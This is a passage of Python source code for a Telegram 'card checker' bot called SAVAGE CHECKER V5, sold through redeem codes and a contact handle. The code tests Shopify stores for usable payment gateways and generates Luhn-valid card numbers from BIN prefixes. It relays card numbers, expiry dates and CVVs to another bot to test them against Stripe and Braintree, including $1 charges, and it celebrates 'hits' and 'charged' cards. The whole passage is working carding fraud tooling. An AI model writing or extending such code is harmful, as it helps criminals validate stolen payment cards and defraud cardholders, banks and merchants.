                            await asyncio.sleep(SITE_TEST_RETRY_DELAY)
                            continue
                        async with results_lock:
                            dead.append(site)
                            failure_reasons[site] = last_reason
                        logger.info(f"❌ {site} → DEAD ({last_reason})")
                        return

        # Run all site tests concurrently
        tasks = [test_one_site(site) for site in sites_to_test]
        await asyncio.gather(*tasks, return_exceptions=True)

        # Save working sites to file
        with open("working_sites_api.txt", "w") as f:
            f.write("\n".join(working))
        # Save GOOD sites (strict: real payment responses only)
        with open("good_sites_api.txt", "w") as f:
            f.write("\n".join(good_sites))
        logger.info(f"📝 Site test complete: {len(working)} working, {len(good_sites)} GOOD, ({len(captcha_sites)} CAPTCHA), {len(dead)} dead")
        logger.info(f"📝 Saved {len(working)} working sites to working_sites_api.txt")
        logger.info(f"📝 Saved {len(good_sites)} good sites to good_sites_api.txt")

        # Log top failure reasons summary
        if failure_reasons:
            reason_counts = {}
            for r in failure_reasons.values():
                key = r.split("|")[0].strip() if "|" in r else r
                reason_counts[key] = reason_counts.get(key, 0) + 1
            logger.info("📊 Failure breakdown:")
            for reason, count in sorted(reason_counts.items(), key=lambda x: -x[1])[:10]:
                logger.info(f"   {count}x — {reason}")

        return working, dead

    def load_working_sites_from_file(self):
        """Load tested working sites from working_sites_api.txt (or legacy working_sites_graphql.txt).
        Also loads good_sites_api.txt if available."""
        # Load good sites
        if Path("good_sites_api.txt").exists():
            with open("good_sites_api.txt", "r") as f:
                good = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            if good:
                self.good_sites = good
                logger.info(f"✅ Loaded {len(good)} good sites from good_sites_api.txt")

        for filepath_name in ["working_sites_api.txt", "working_sites_graphql.txt"]:
            filepath = Path(filepath_name)
            if filepath.exists():
                with open(filepath, "r") as f:
                    sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                if sites:
                    self.working_sites = sites
                    self.site_index = 0
                    logger.info(f"✅ Loaded {len(sites)} working sites from {filepath_name}")
                    # If good_sites available, prefer them for working list
                    if self.good_sites:
                        self.working_sites = list(self.good_sites)
                        self.site_index = 0
                        logger.info(f"✅ Using {len(self.good_sites)} good sites as working sites")
                    return len(self.working_sites)
        return 0

    def parse_shopify_response(self, raw: str) -> dict:
        """Parse raw Shopify API response (legacy compatibility)."""
        info: dict = {"approved": False, "reason": "Unknown", "gate": "", "amount": "0.00"}
        try:
            data = json.loads(raw)
            if isinstance(data, dict):
                info["gate"] = data.get("gateway", "")
                info["amount"] = str(data.get("amount", "0.00"))
                info["currency"] = data.get("currency", "USD")
                status = str(data.get("status", "")).lower()
                reason = data.get("reason", data.get("message", ""))
                if status in ("charged", "approved"):
                    info["approved"] = True
                    info["reason"] = reason or status.upper()
                elif status == "declined":
                    info["reason"] = reason or "DECLINED"
                elif status == "error":
                    info["reason"] = reason or "Error"
                else:
                    info["reason"] = reason or raw[:60]
            else:
                info["reason"] = raw[:60] if raw else "Empty response"
        except (json.JSONDecodeError, ValueError):
            raw_lower = (raw or "").lower()
            if any(m in raw_lower for m in ["charged", "approved", "success"]):
                info["approved"] = True
                info["reason"] = raw[:100]
            elif "declined" in raw_lower:
                info["reason"] = raw[:100]
            else:
                info["reason"] = raw[:60] if raw else "Empty response"
        return info

    # ═══════════════ BIN Lookup ═══════════════
    async def get_bin_info(self, bin_number: str) -> Optional[dict]:
        bin_number = bin_number[:6]
        if bin_number in self._bin_cache:
            return self._bin_cache[bin_number]
        url = BIN_API_URL.format(bin_number)
        try:
            session = await self.get_http_session()
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    self._bin_cache[bin_number] = data
                    return data
        except:
            pass
        return None

    # ═══════════════ Card Generator ═══════════════
    def luhn_checksum(self, card_number: str) -> int:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10

    def generate_card_number(self, bin_prefix: str) -> str:
        length = 16
        while len(bin_prefix) < length:
            bin_prefix += str(random.randint(0, 9))
        check_digit = (10 - self.luhn_checksum(bin_prefix[:15])) % 10
        return bin_prefix[:15] + str(check_digit)

    def generate_cards(self, count: int, bin_input: Optional[str] = None) -> List[str]:
        cards = []
        for _ in range(count):
            if bin_input and bin_input.isdigit() and len(bin_input) >= 6:
                bin_prefix = bin_input[:6]
            else:
                bin_prefix = random.choice(["424242", "400005", "555555", "411111", "378282"])
            card_num = self.generate_card_number(bin_prefix)
            now = datetime.now()
            future_year = now.year + random.randint(1, 4)
            month = random.randint(1, 12)
            mm = f"{month:02d}"
            yy = str(future_year)[-2:]
            cvv = f"{random.randint(100, 999):03d}"
            cards.append(f"{card_num}|{mm}|{yy}|{cvv}")
        return cards

    # ═══════════════ File Helpers ═══════════════
    def save_cards_file(self, content: bytes, user_id: int, chat_id: int) -> str:
        filename = f"{user_id}_{chat_id}_{uuid.uuid4().hex}.txt"
        filepath = os.path.join(STORAGE_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(content)
        return filepath

    def validate_cards_file(self, filepath: str, max_cards: int) -> Tuple[bool, int, Optional[str]]:
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
        except Exception as e:
            return False, 0, f"Error: {e}"
        if len(lines) > max_cards:
            return False, len(lines), f"File has {len(lines)} cards. Max {max_cards}."
        pattern = re.compile(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$")
        invalid = [l for l in lines if not pattern.match(l)]
        if invalid:
            return False, len(lines), f"Invalid format: {invalid[:3]}"
        return True, len(lines), None

    # ═══════════════════════════════════════════════
    # ✨ MEGA PREMIUM UI — Response Formatters
    # ═══════════════════════════════════════════════

    async def format_stripe_approved(self, card_line: str, raw: str, include_charge: bool = False) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = await self.get_bin_info(cc)
        bin_block = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            emoji = bin_info.get('country', {}).get('emoji', '🌍')
            bank = bin_info.get('bank', {}).get('name', 'Unknown')
            ctype = bin_info.get('type', 'Unknown').upper()
            bin_block = (
                f"│  🏦 Bank:     <code>{bank}</code>\n"
                f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                f"│  {emoji} Country:  <code>{country}</code>\n"
            )
        gateway = "Stripe"
        for line in raw.split('\n'):
            if "Gateway:" in line:
                gateway = line.split("Gateway:")[-1].strip()

        charge_line = ""
        if include_charge:
            charge = self.extract_charge(raw)
            if charge:
                charge_line = f"│  💰 Charged:   <code>${charge:.2f}</code>\n"

        return (
            "╔══════════════════════════════════════╗\n"
            "║  ⚡ 𝗦𝗧𝗥𝗜𝗣𝗘  ─  𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅🔥      ║\n"
            "╠══════════════════════════════════════╣\n\n"
            "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
            "│\n"
            f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
            f"{bin_block}"
            f"│  🏧 Gateway:   <code>{gateway}</code>\n"
            f"{charge_line}"
            f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
            "│\n"
            "└──────────────────────────────────────┘\n\n"
            "🟢 Status: APPROVED ✅ — ɢᴏᴛ ᴇᴍ 💀\n"
            "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━"
        )

    async def format_braintree_auth(self, card_line: str, raw: str) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = await self.get_bin_info(cc)
        bin_block = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            emoji = bin_info.get('country', {}).get('emoji', '🌍')
            bank = bin_info.get('bank', {}).get('name', 'Unknown')
            ctype = bin_info.get('type', 'Unknown').upper()
            bin_block = (
                f"│  🏦 Bank:     <code>{bank}</code>\n"
                f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                f"│  {emoji} Country:  <code>{country}</code>\n"
            )
        return (
            "╔══════════════════════════════════════╗\n"
            "║  🌐 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘  ─  𝗔𝗨𝗧𝗛��𝗥𝗜𝗭𝗘𝗗 ✅🔥║\n"
            "╠══════════════════════════════════════╣\n\n"
            "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
            "│\n"
            f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
            f"{bin_block}"
            f"│  🏧 Gateway:   <code>Braintree (Auth)</code>\n"
            f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
            "│\n"
            "└──────────────────────────────────────┘\n\n"
            "🟢 Status: AUTHORIZED ✅ — ɢᴏᴛ ᴇᴍ 💀\n"
            "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━"
        )

    async def format_braintree_charged(self, card_line: str, raw: str) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = await self.get_bin_info(cc)
        bin_block = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            emoji = bin_info.get('country', {}).get('emoji', '🌍')
            bank = bin_info.get('bank', {}).get('name', 'Unknown')
            ctype = bin_info.get('type', 'Unknown').upper()
            bin_block = (
                f"│  🏦 Bank:     <code>{bank}</code>\n"
                f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                f"│  {emoji} Country:  <code>{country}</code>\n"
            )
        return (
            "╔══════════════════════════════════════╗\n"
            "║  💰 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘  ─  𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥     ║\n"
            "╠══════════════════════════════════════╣\n\n"
            "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
            "│\n"
            f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
            f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
            f"{bin_block}"
            f"│  🏧 Gateway:   <code>Braintree (Charge)</code>\n"
            f"│  💵 Amount:    <code>$1.00</code>\n"
            f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
            "│\n"
            "└──────────────────────────────────────┘\n\n"
            "💰 Status: CHARGED 🔥 — ᴍᴏɴᴇʏ ʜɪᴛ 💣\n"
            "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━"
        )

    async def format_shopify_result(self, card_line: str, approved: bool, info: dict,
                                    used_proxy: str = None) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = await self.get_bin_info(cc)
        bin_block = ""
        if bin_info:
            brand = bin_info.get('brand', '?')
            country = bin_info.get('country', {}).get('name', '?')
            emoji = bin_info.get('country', {}).get('emoji', '🌍')
            bank = bin_info.get('bank', {}).get('name', '?')
            ctype = bin_info.get('type', '?').upper()
            bin_block = (
                f"│  🏦 Bank:     <code>{bank}</code>\n"
                f"│  🔖 Brand:    <code>{brand}</code> • <code>{ctype}</code>\n"
                f"│  {emoji} Country:  <code>{country}</code>\n"
            )

        site_used = info.get("site", "unknown")
        gateway = info.get("gate", "SHOPIFY-RELOADED") or "SHOPIFY-RELOADED"
        proxy_line = f"│  🔗 Proxy:    <code>{used_proxy[:40]}…</code>" if used_proxy else "│  🌐 Mode:     <code>Direct Reloaded V2</code>"
        currency = info.get("currency", "USD")

        if approved:
            amount = info.get("amount", "0.00")
            reason = info.get("reason", "APPROVED")
            status_label = "CHARGED" if "CHARGED" in reason.upper() or "ORDER" in reason.upper() else "APPROVED"
            status_icon = "💰" if status_label == "CHARGED" else "✅"
            return (
                "╔══════════════════════════════════════╗\n"
                f"║  🛒 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  {status_label} {status_icon}🔥      ║\n"
                "╠══════════════════════════════════════╣\n"
                f"║  💎 Shopify Reloaded entity V2 ENGINE       ║\n"
                "╚══════════════════════════════════════╝\n\n"
                "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
                "│\n"
                f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
                f"{bin_block}"
                "│\n"
                "├──────── 🌐 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗜𝗻𝗳𝗼 ─────────┤\n"
                "│\n"
                f"│  🏪 Site:      <code>{site_used}</code>\n"
                f"│  🏧 Gateway:   <code>{gateway}</code>\n"
                f"{proxy_line}\n"
                f"│  {status_icon} Amount:   <code>${amount} {currency}</code>\n"
                f"│  📝 Reason:    <code>{reason}</code>\n"
                f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
                "│\n"
                "└──────────────────────────────────────┘\n\n"
                f"🟢 Status: {status_label} {status_icon} — ɢᴏᴛ ᴇᴍ 💀🔥\n"
                "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━\n"
                "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
            )
        else:
            reason = info.get("reason", "Unknown error")
            amount = info.get("amount", "0.00")
            return (
                "╔══════════════════════════════════════╗\n"
                "║  🛒 𝗦𝗛𝗢𝗣𝗜𝗙𝗬  ─  𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌💀  ║\n"
                "╠══════════════════════════════════════╣\n"
                "║  💎 Shopify Reloaded entity V2 ENGINE       ║\n"
                "╚══════════════════════════════════════╝\n\n"
                "┌──────── 💳 𝗖𝗮𝗿𝗱 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ─────────┐\n"
                "│\n"
                f"│  💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"│  🔢 BIN:       <code>{cc[:6]}</code>\n"
                f"{bin_block}"
                "│\n"
                "├──────── 🌐 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗜𝗻𝗳𝗼 ─────────┤\n"
                "│\n"
                f"│  🏪 Site:      <code>{site_used}</code>\n"
                f"│  🏧 Gateway:   <code>{gateway}</code>\n"
                f"{proxy_line}\n"
                f"│  🚫 Reason:    <code>{reason}</code>\n"
                f"│  ⏰ Time:      <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
                "│\n"
                "└──────────────────────────────────────┘\n\n"
                "🔴 Status: DECLINED ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀\n"
                "━━━ 💀 ━━━ ✦ ━━━ 🔥 ━━━\n"
                "━━━ ᴄʜᴇᴄᴋᴇʀ ᴍᴀᴅᴇ ʙʏ ᴜɴᴋɴᴏᴡɴᴇɴᴛɪᴛʏ ━━━"
            )

    async def format_owner_hit(self, card_line: str, gateway: str, raw: str = "", info: dict = None) -> str:
        parts = card_line.split('|')
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = await self.get_bin_info(cc)
        bin_line = ""
        if bin_info:
            brand = bin_info.get('brand', 'Unknown')
            country = bin_info.get('country', {}).get('name', 'Unknown')
            bin_line = f"BIN: {cc[:6]} | {brand} | {country}"
        return (
            f"⚡ [{gateway.upper()} HIT]\n"
            f"💳 {cc}|{mm}|{yy}|{cvv}\n"
            f"{bin_line}"
        )

    def extract_charge(self, raw: str) -> Optional[float]:
        match = re.search(r'\$(\d+\.\d{2})', raw)
        if match:
            return float(match.group(1))
        return None

    def is_charged_response(self, raw: str) -> bool:
        charged_keywords = [
            "charged successfully", "payment successful", "charge success",
            "transaction completed", "amount charged", "charged $"
        ]
        raw_lower = raw.lower()
        return any(keyword in raw_lower for keyword in charged_keywords)

    def progress_bar(self, cur: int, tot: int, width: int = 20) -> str:
        if tot == 0:
            percent = 0
        else:
            percent = cur / tot
        filled = int(width * percent)
        empty = width - filled
        bar = '█' * filled + '░' * empty
        return f"<code>[{bar}]</code> <b>{percent:.0%}</b>"

    # ═══════════════ FIX: PayU — Full 60s wait, no stuck ═══════════════
    async def send_card_to_payu(self, card_line: str, gateway: str = 'stripe') -> str:
        await self._rate_limit_user()

        if gateway == 'braintree':
            cmd = f"/bt {card_line}"
        else:
            cmd = f"/st {card_line}"

        last_seen_id = 0
        try:
            async for msg in self.user_client.iter_messages(PAYU_BOT_USERNAME, limit=1):
                last_seen_id = msg.id
        except Exception:
            last_seen_id = 0

        sent = await self.user_client.send_message(PAYU_BOT_USERNAME, cmd)
        sent_id = sent.id

        # FIX: wait full CARD_CHECK_TIMEOUT (60s), poll every 1s
        deadline = time.time() + CARD_CHECK_TIMEOUT

        while time.time() < deadline:
            await asyncio.sleep(1.0)
            try:
                async for msg in self.user_client.iter_messages(PAYU_BOT_USERNAME, limit=20):
                    if msg.id <= sent_id:
                        break
                    if msg.out:
                        continue
                    if not msg.text:
                        continue
                    text_lower = msg.text.lower()
                    # Skip intermediate loading messages
                    if any(kw in text_lower for kw in [
                        "processing", "checking", "please wait", "⏳",
                        "loading", "wait", "fetching", "validating", "hold on"
                    ]):
                        continue
                    return msg.text
            except Exception as e:
                logger.debug(f"PayU poll error: {e}")
                await asyncio.sleep(1.0)

        return f"Timeout: No response after {CARD_CHECK_TIMEOUT}s"

    def is_approved(self, resp: str) -> bool:
        if not resp:
            return False
        low = resp.lower()
        return "approved" in low and "processing" not in low and "declined" not in low

    # ═══════════════════════════════════════════════
    # ✨ MEGA PREMIUM UI — Dashboard & Helpers
    # ═══════════════════════════════════════════════

    async def show_user_dashboard(self, user_id: int, chat_id: int):
        exp_global = self.users.get(user_id)
        if user_id in self.users:
            global_str = "♾ Permanent" if exp_global is None else exp_global.strftime("%Y-%m-%d %H:%M UTC")
            g_icon = "🟢"
        else:
            global_str = "No Access"
            g_icon = "🔴"

        exp_shop = self.shopify_users.get(user_id)
        if user_id in self.shopify_users:
            shop_str = "♾ Permanent" if exp_shop is None else exp_shop.strftime("%Y-%m-%d %H:%M UTC")
            s_icon = "🟢"
        else:
            shop_str = "No Access"
            s_icon = "🔴"

        stats = self.get_user_stats(user_id)
        checked = stats.get("total_checked", 0)
        approved = stats.get("total_approved", 0)
        charged = stats.get("total_charged", 0)
        rate = (approved / checked * 100) if checked else 0.0

        rate_bar_w = 10
        rate_filled = int(rate_bar_w * (rate / 100)) if rate <= 100 else rate_bar_w
        rate_bar = '█' * rate_filled + '░' * (rate_bar_w - rate_filled)

        await self.safe_send_message(chat_id,
            "╔══════════════════════════════════════╗\n"
            "║  👤 𝗠𝗬 𝗔𝗖𝗖𝗢𝗨𝗡𝗧                      ║\n"
            "╠══════════════════════════════════════╣\n\n"

            "┌──────── 🔐 𝗔𝗰𝗰𝗲𝘀𝘀 ────────────┐\n"
            f"│  {g_icon} Global:   <code>{global_str}</code>\n"
            f"│  {s_icon} Shopify:  <code>{shop_str}</code>\n"
            "└──────────────────────────────────────┘\n\n"

            "┌──────── 📊 𝗦𝘁𝗮𝘁𝘀 ─────────────┐\n"
            f"│  🔍 Checked:  <code>{checked:,}</code>\n"
            f"│  ✅ Approved: <code>{approved:,}</code>\n"
            f"│  💰 Charged:  <code>{charged:,}</code>\n"
            f"│  📈 Hit Rate: <code>[{rate_bar}] {rate:.1f}%</code>\n"
            "└──────────────────────────────────────┘\n\n"

            f"🆔 <code>{user_id}</code>"
        )

    async def bin_search(self, chat_id: int, bin_number: str):
        info = await self.get_bin_info(bin_number)
        if info:
            brand = info.get('brand', 'Unknown')
            issuer = info.get('bank', {}).get('name', 'Unknown')
            country = info.get('country', {}).get('name', 'Unknown')
            emoji = info.get('country', {}).get('emoji', '🌍')
            ctype = info.get('type', 'Unknown').upper()
            prepaid = "✅ Yes" if info.get('prepaid') else "❌ No"
            result = (
                "╔══════════════════════════════════════╗\n"
                "║  🔍 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣                      ║\n"
                "╠══════════════════════════════════════╣\n\n"
                "┌──────── 📋 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 ───────────┐\n"
                f"│  🔢 BIN:      <code>{bin_number}</code>\n"
                f"│  🔖 Brand:    <code>{brand}</code>\n"
                f"│  📋 Type:     <code>{ctype}</code>\n"
                f"│  🏦 Issuer:   <code>{issuer}</code>\n"
                f"│  {emoji} Country:  <code>{country}</code>\n"
                f"│  💳 Prepaid:  <code>{prepaid}</code>\n"
                "└──────────────────────────────────────┘"
            )
        else:
            result = (
                "╔══════════════════════════════════════╗\n"
                "║  🔍 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣                      ║\n"
                "╠══════════════════════════════════════╣\n\n"
                f"❌ No data found for BIN <code>{bin_number}</code>"
            )
        await self.safe_send_message(chat_id, result)

    async def animated_startup(self, event):
        """Savage-style loading animation with glowing frames."""
        msg = await event.reply(ANIME_FRAMES[0], parse_mode='html')
        for frame in ANIME_FRAMES[1:]:
            await asyncio.sleep(0.5)
            try:
                await msg.edit(frame, parse_mode='html')
            except Exception:
                pass
        await asyncio.sleep(0.4)
        await msg.delete()

    async def glowing_success(self, msg, final_text):
        glow = [
            "💀 <code>⟦ ꜱᴄᴀɴɴɪɴɢ ᴛᴀʀɢᴇᴛ... ⟧</code> 🎯",
            "⚡ <code>⟦ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛʏ ꜰᴏᴜɴᴅ! ⟧</code> 🗡️",
            "🔥 <code>⟦ ᴇxᴘʟᴏɪᴛɪɴɢ ɢᴀᴛᴇᴡᴀʏ... ⟧</code> 💣",
            "👑 <code>⟦ ᴋɪʟʟ ᴄᴏɴꜰɪʀᴍᴇᴅ ⟧</code> 💀🔥",
        ]
        for g in glow:
            try:
                await msg.edit(g, parse_mode='html')
            except Exception:
                pass
            await asyncio.sleep(0.3)
        await msg.edit(final_text, parse_mode='html')

    async def pulse_progress(self, chat_id, msg_id, current, total, card_preview, job_id, elapsed_str,
                             remaining_str):
        bar = self.progress_bar(current, total)
        job = self.active_jobs.get(job_id, {})
        hits = job.get('approved_cards', [])
        hit_count = len(hits) if isinstance(hits, list) else 0
        declined = job.get('declined_count', 0)

        # FIX: Real speed display — calculate actual cards/sec and avg time per card
        speed_line = ""
        try:
            # Parse elapsed time from HH:MM:SS or MM:SS string
            parts = elapsed_str.split(":")
            if len(parts) == 3:
                elapsed_secs = int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
            elif len(parts) == 2:
                elapsed_secs = int(parts[0]) * 60 + int(parts[1])
            else:
                elapsed_secs = 0
            if current > 0 and elapsed_secs > 0:
                cards_per_sec = current / elapsed_secs
                avg_per_card = elapsed_secs / current
                cards_per_min = cards_per_sec * 60
                speed_line = f"│  💨 Speed:     <code>{cards_per_min:.1f} cards/min</code>\n│  ⏱️ Avg:       <code>{avg_per_card:.1f}s/card</code>\n"
            else:
                speed_line = "│  💨 Speed:     <code>calculating...</code>\n"
        except Exception:
            speed_line = "│  💨 Speed:     <code>calculating...</code>\n"

        text = (
            "╔══════════════════════════════════════╗\n"
            "║  🌸 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ─ 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 ⚡         ║\n"
            "╠══════════════════════════════════════╣\n\n"
            f"    {bar}\n\n"
            "┌──────── 📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ──────────┐\n"
            "│\n"
            f"│  📃 Done:      <code>{current}/{total}</code>\n"
            f"│  💀 Hits:      <code>{hit_count}</code>\n"
            f"│  ❌ Declined:  <code>{declined}</code>\n"
            f"{speed_line}"
            f"│  ⏱ Elapsed:   <code>{elapsed_str}</code>\n"
            f"│  ⏳ ETA:       <code>~{remaining_str}</code>\n"
            f"│  🔍 Current:   <code>{card_preview[:20]}…</code>\n"
            "│\n"
            "└──────────────────────────────────────┘"
        )
        await self.safe_edit_message(chat_id, msg_id, text,
                                     buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"))

    # ═══════════════════════════════════════════════
    # 👑 SAVAGE PREMIUM UI — Bot Handlers
    # ═══════════════════════════════════════════════

    async def start_bot(self):

        @self.bot_client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            uid = event.sender_id
            if not self.has_any_access(uid):
                btns = [[Button.inline("🎟️ 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 🔑", data="redeem_menu")]]
                await event.reply(
                    "╔══════════════════════════════════════╗\n"
                    "║  🔒 𝗔𝗖𝗖𝗘𝗦𝗦  𝗗𝗘𝗡𝗜𝗘𝗗 💀              ║\n"
                    "╠══════════════════════════════════════╣\n"
                    "║                                      ║\n"
                    "║  ⛔ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀᴄᴄᴇꜱꜱ        ║\n"
                    "║     ᴛᴏ ᴛʜɪꜱ ᴡᴇᴀᴘᴏɴ ꜱʏꜱᴛᴇᴍ.        ║\n"
                    "║                                      ║\n"
                    "║  📩 DM: @Unknownentit7               ║\n"
                    "║  🎟️ Or redeem a code below 👇        ║\n"
                    "║                                      ║\n"
                    "╚══════════════════════════════════════╝",
                    buttons=btns,
                    parse_mode='html'
                )
                return

            await self.animated_startup(event)
            tc = self.stats['total_checked']
            ta = self.stats['total_approved']
            sr = (ta / tc * 100) if tc else 0.0
            speed = 1 / DELAY_BETWEEN_CHECKS
            speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"

            header = (
                "╔══════════════════════════════════════╗\n"
                "║  👑 𝗦𝗔𝗩𝗔𝗚𝗘  𝗖𝗛𝗘𝗖𝗞𝗘𝗥  𝗩𝟱 🔥         ║\n"
                "║  ─── ᴘʀᴇᴍɪᴜᴍ ʀᴇʟᴏᴀᴅᴇᴅ V2 ᴍᴏᴅᴇ ── ║\n"
                "╠══════════════════════════════════════╣\n\n"

                "┌──────── 🖥 𝗦𝘆𝘀𝘁𝗲𝗺 ─────────────┐\n"
                "│  🟢 Status:  <code>ONLINE 🔥</code>\n"
                f"│  🧠 Engine:  <code>Reloaded V2 ⚡</code>\n"
                f"│  💨 Speed:   <code>{speed_str} cards/sec</code>\n"
                f"│  🕒 Uptime:  <code>{self.get_uptime()}</code>\n"
                "└──────────────────────────────────────┘\n\n"

                "┌──────── 📊 𝗞𝗶𝗹𝗹 𝗦𝘁𝗮𝘁𝘀 ─────────┐\n"
                f"│  🔍 Checked:  <code>{tc:,}</code>\n"
                f"│  💀 Hits:     <code>{ta:,}</code>\n"
                f"│  📈 Rate:     <code>{sr:.1f}%</code>\n"
                "└──────────────────────────────────────┘\n\n"

                "┌──────── 📃 𝗟𝗶𝗺𝗶𝘁𝘀 ────────────┐\n"
                f"│  ⚡ Stripe:    <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>\n"
                f"│  🌐 Braintree: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code>\n"
                f"│  🛒 Shopify:   <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n"
                "└──────────────────────────────────────┘\n\n"

                "👇 <b>ᴘɪᴄᴋ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ 💀</b>"
            )
            btns = []
            if self.is_user_approved(uid):
                btns.extend([
                    [Button.inline("⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 🗡️", data="mode_single"),
                     Button.inline("🌐 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 💉", data="mode_bt_single")],
                    [Button.inline("📃 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 🔥", data="mode_mass"),
                     Button.inline("📃 𝗕𝗧 𝗠𝗮𝘀𝘀 💣", data="mode_bt_mass")],
                ])
            if self.is_shopify_approved(uid):
                btns.append([Button.inline("🛒 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗩𝟮 ☠️", data="shopify_menu")])
            btns.extend([
                [Button.inline("👤 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 💎", data="account"),
                 Button.inline("ℹ️ 𝗛𝗲𝗹𝗽 📖", data="help_menu")],
                [Button.inline("🔍 𝗕𝗜𝗡 🧬", data="bin_search"),
                 Button.inline("🎴 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 🎲", data="card_gen")],
            ])
            if uid in ADMINS:
                btns.append([Button.inline("⚙️ 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 👑", data="admin")])
            await event.reply(header, buttons=btns, parse_mode='html')

        @self.bot_client.on(events.NewMessage(func=lambda e: e.message.document))
        async def txt_file_forward_handler(event):
            doc = event.message.document
            if not doc:
                return
            filename = getattr(doc.attributes[0], 'file_name', '') if doc.attributes else ''
            if not filename.lower().endswith('.txt'):
                return
            user_id = event.sender_id
            try:
                try:
                    user_entity = await self.bot_client.get_entity(user_id)
